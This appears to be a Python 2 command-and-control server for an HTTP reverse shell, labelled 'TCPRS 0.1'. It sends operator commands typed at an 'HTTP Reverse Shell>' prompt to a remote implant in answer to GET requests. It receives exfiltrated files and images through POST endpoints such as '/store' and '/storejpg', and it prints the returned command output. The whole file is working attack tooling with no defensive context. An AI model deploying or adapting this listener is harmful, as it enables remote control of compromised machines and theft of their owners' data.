#!/usr/bin/env python
# -*- coding: utf-8 -*-

#------------------------------------------------------------------------------
# Modules
#------------------------------------------------------------------------------

import socket
import os
import sys
import argparse
import hashlib
import BaseHTTPServer
import cgi

#------------------------------------------------------------------------------
# Class HTTPHandler
#------------------------------------------------------------------------------

class HTTPHandler(BaseHTTPServer.BaseHTTPRequestHandler):   

    filename = ""

    def do_GET(socketconnection):
        command = raw_input("HTTP Reverse Shell> ")
        socketconnection.send_response(200)
        socketconnection.send_header("Content-type", "text/html")
        socketconnection.end_headers()
        socketconnection.wfile.write(command)

            
    def do_POST(socketconnection):
       
        if socketconnection.path == '/storejpg':
            try:
                ctype, pdict = cgi.parse_header(socketconnection.headers.getheader('content-type'))
                if ctype == 'multipart/form-data' :
                    fs = cgi.FieldStorage(fp = socketconnection.rfile, 
                                        headers = socketconnection.headers, 
                                        environ={ 'REQUEST_METHOD':'POST' })
                else:
                    print "[-] Unexpected POST request"
                    
                fs_up = fs['file']     
                filenameimg = hashlib.sha224(str(fs_up)).hexdigest()
                filenamejpg = filenameimg + ".jpg"

                with open(filenamejpg, 'wb') as o:
                    o.write( fs_up.file.read() )
                    socketconnection.send_response(200)
                    socketconnection.end_headers()

            except Exception as e:
                print e
                
            return

        if socketconnection.path == '/filename':
            length  = int(socketconnection.headers['Content-Length'])                    
            global filename              
            filename = socketconnection.rfile.read(length)    
            socketconnection.send_response(200)
            socketconnection.end_headers()    
            return

        if socketconnection.path == '/store':
 
            try:
                ctype, pdict = cgi.parse_header(socketconnection.headers.getheader('content-type'))
                if ctype == 'multipart/form-data' :
                    fs = cgi.FieldStorage(fp = socketconnection.rfile, 
                                        headers = socketconnection.headers, 
                                        environ={ 'REQUEST_METHOD':'POST' })
                else:
                    print "[-] Unexpected POST request"
                    
                fs_up = fs['file']
                with open(filename, 'wb') as o:
                    o.write( fs_up.file.read() )
                    socketconnection.send_response(200)
                    socketconnection.end_headers()
            except Exception as e:
                print e
                
            return

        # HTML status 200 (OK)
        socketconnection.send_response(200)                         
        socketconnection.end_headers()
        length  = int(socketconnection.headers['Content-Length'])  
        postVar = socketconnection.rfile.read(length)
        print postVar
        
#------------------------------------------------------------------------------
# Python version check.
#------------------------------------------------------------------------------

if __name__ == "__main__":
    if sys.version_info < (2, 7) or sys.version_info >= (3, 0):
        show_banner()
        print ("[!] You must use Python version 2.7 or above")
        sys.exit(1)

#------------------------------------------------------------------------------
# Command line parser using argparse
#------------------------------------------------------------------------------

def cmdline_parser():
    parser = argparse.ArgumentParser(conflict_handler='resolve', add_help=True, description='Example: python %(prog)s -i 1.2.3.4 -p 80', version='TCPRS 0.1',
             usage="python %(prog)s [OPTIONS]")

    parser.add_argument('-i', '--ip', action='store', dest='ip', help='IP')
    parser.add_argument('-p', '--port', action='store', dest='port', help='Port')
    return parser

#------------------------------------------------------------------------------
# Start of program
#------------------------------------------------------------------------------

def main():

    # Get the command line parser.
    parser = cmdline_parser()

    # Show help if no args
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    # Get results line parser.
    results = parser.parse_args()

    print "[+] HTTP Server listening in " + results.ip + " and port " + results.port
 
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((results.ip, int(results.port)), HTTPHandler)
    
    try:     
        httpd.serve_forever()
    except KeyboardInterrupt:
        print '[!] Server is terminated'
        httpd.server_close()

#------------------------------------------------------------------------------
# Main
#------------------------------------------------------------------------------

if __name__ == '__main__':
	main()